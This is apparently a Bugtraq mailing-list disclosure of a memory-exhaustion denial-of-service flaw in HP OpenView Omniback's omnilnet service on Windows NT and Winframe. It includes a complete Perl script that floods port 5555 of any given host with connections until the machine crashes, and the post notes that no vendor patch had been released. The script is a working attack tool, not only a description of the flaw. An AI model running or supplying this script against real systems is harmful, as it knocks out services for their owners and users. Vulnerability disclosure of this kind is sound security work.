From: Jon <jon@HITTNER.COM>
Subject:      HP Omniback remote DoS
X-To:         BUGTRAQ@SECURITYFOCUS.COM
To: BUGTRAQ@SECURITYFOCUS.COM

Hi,
   There seems to be a bug in HP Openview Omniback software.   If a number
of connections are established to port 5555 to an omniback system, the
omnilnet process starts to consume more and more memory until the machine
crashes.   If the test is stopped, and the connections closed, Omniback does
not free up the memory.  I've tested this bug with Omniback vers 2.55, 3.0,
and 3.10(newest), running on NT4.0 SP5 , NT3.51 , Winframe 1.7 SP5b , and
Winframe 1.8.   All these systems seem to be vulnerable.  Omniback on
Solaris and on HPUX do not seem to have the problem.  I've notified HP about
the bug several weeks ago, and they have not yet released a patch.  The
following sample code will demonstrate the problem, but a better exploit
could probably be written.

Jon Hittner

#!/usr/bin/perl
#
# Jon Hittner
# Raise the memory size for omnilnet until Windows NT crashes
# Test against NT4.0 SP5 , NT3.51 , Winframe 1.7 SP5b , Winframe 1.8
# Probably needs to be run several times to crash the system depending
# on the amount of memory in the system.
# This code was written to demo a problem, and I take no respoablity on how
# it's used

use strict; use Socket;

my($y,$h,$p,$in_addr,$proto,$addr);

$h = "$ARGV[0]"; $p = 5555 if (!$ARGV[1]);
if (!$h) { print "A hostname must be provided. Ex: www.domain.com\n"; }

$in_addr = (gethostbyname($h))[4]; $addr = sockaddr_in($p,$in_addr);
$proto = getprotobyname('tcp');
print "TESTING: $h:$p\n";
for ($y=1 ; $y<2500000 ; $y++) {
	socket(S, AF_INET, SOCK_STREAM, $proto);
	connect(S,$addr) or next;
	select S;
	$| = 1;
	select STDOUT;
	send S,"OMNIBACK HAS SOME BIG ISSUES",0;
	}
print "ATTACK COMPLETED!\n";


